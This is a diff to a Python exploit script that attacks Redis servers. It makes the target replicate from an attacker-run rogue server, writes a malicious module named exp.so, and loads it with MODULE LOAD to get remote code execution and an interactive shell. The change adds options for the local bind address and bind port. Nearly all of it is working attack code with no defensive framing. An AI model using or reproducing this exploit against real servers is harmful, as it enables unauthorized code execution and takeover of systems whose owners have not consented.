@@ -111,13 +111,13 @@ def interact(remote):
     except KeyboardInterrupt:
         return
 
-def runserver(rhost, rport, lhost, lport):
+def runserver(rhost, rport, lhost, lport, local_bind_addr="0.0.0.0", local_bind_port=None):
     # expolit
     remote = Remote(rhost, rport)
     remote.do(f"SLAVEOF {lhost} {lport}")
     remote.do("CONFIG SET dbfilename exp.so")
     sleep(2)
-    rogue = RogueServer(lhost, lport)
+    rogue = RogueServer(local_bind_addr, local_bind_port)
     rogue.exp()
     sleep(2)
     remote.do("MODULE LOAD ./exp.so")
@@ -141,11 +141,16 @@ if __name__ == '__main__':
             help="rogue server ip")
     parser.add_option("--lport", dest="lp", type="int",
             help="rogue server listen port, default 21000", default=21000)
+    parser.add_option("--lport-local", dest="lpl", type="int",
+        help="local bind port (if different from lport)", default=None)
+    parser.add_option("--lbind", dest="lb", type="string",
+        help="local bind address, default 0.0.0.0", default="0.0.0.0")
 
     (options, args) = parser.parse_args()
     if not options.rh or not options.lh:
         parser.error("Invalid arguments")
     #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
+    local_port = options.lpl if options.lpl else options.lp
     print(f"TARGET {options.rh}:{options.rp}")
     print(f"SERVER {options.lh}:{options.lp}")
-    runserver(options.rh, options.rp, options.lh, options.lp)
+    runserver(options.rh, options.rp, options.lh, options.lp, options.lb, local_port)
